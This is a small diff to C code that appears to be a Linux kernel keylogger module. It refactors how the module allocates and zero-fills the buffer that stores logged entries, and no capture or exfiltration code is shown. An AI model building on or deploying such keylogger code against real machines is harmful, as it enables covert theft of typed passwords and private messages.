@@ -38,14 +38,15 @@ t_keylogger_data keylogger_data;
 static int add_new_entry(char *entry)
 {
 	char *tmp_buff;
-	if (!(tmp_buff = vmalloc((keylogger_data.log_buffer ? strlen(entry) + strlen(keylogger_data.log_buffer) + 1 : strlen(entry) + 1))))
+	size_t alloc_size = keylogger_data.log_buffer ? strlen(entry) + strlen(keylogger_data.log_buffer) + 1 : strlen(entry) + 1;
+	if (!(tmp_buff = vmalloc(alloc_size)))
 	{
 		if (keylogger_data.log_buffer)
 			vfree(keylogger_data.log_buffer);
 		printk(KERN_ERR "Failed to allocate memory for new log entry\n");
 		return (1);
 	}
-	tmp_buff[0] = '\0';
+	bzero(tmp_buff, alloc_size);
 	if (keylogger_data.log_buffer)
 	{
 		strcpy(tmp_buff, keylogger_data.log_buffer);
